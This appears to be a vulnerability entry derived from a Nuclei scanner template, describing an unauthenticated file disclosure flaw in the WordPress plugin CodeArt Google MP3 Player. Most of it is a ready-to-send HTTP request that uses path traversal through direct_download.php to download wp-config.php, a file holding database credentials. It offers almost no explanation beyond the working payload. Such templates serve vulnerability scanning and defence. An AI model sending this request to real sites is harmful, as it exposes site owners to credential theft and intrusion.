# Vulnerability: WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download
**Classification:** WP-PLUGIN
**Source:** Nuclei Template (`wp-googlemp3-lfi.yaml`)

## Description
WordPress Plugin CodeArt Google MP3 Player allows an unauthenticated attacker to download file from server.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../wp-config.php HTTP/1.1
Host: {{Hostname}}
```

